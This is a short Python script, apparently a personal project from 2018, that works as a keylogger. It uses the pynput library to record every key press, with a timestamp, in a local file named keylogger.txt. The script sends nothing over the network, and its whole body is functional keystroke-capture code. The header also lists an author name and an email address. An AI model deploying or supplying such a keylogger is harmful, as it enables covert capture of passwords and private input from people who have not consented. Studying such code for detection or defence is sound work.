'''
 !/usr/bin/env python
 Function： KeyboardMonitor
 Compiler：PyCharm 
 Developer：Zong Zhaopeng
 Date:  2018/11/25 20:17
 Encoding: utf-8
 Contact: 1003160664@qq.com
 Version: 1.0
 References:
'''
import os
from pynput.keyboard import Listener
import logging

# 程序运行目录
save_path = os.getcwd()
# print(save_path)
logging.basicConfig(filename=(save_path+"\keylogger.txt"),format="%(asctime)s:%(message)s",level=logging.DEBUG)

def press(key):
    logging.info(key)

with Listener(on_press = press) as listener:
        listener.join()

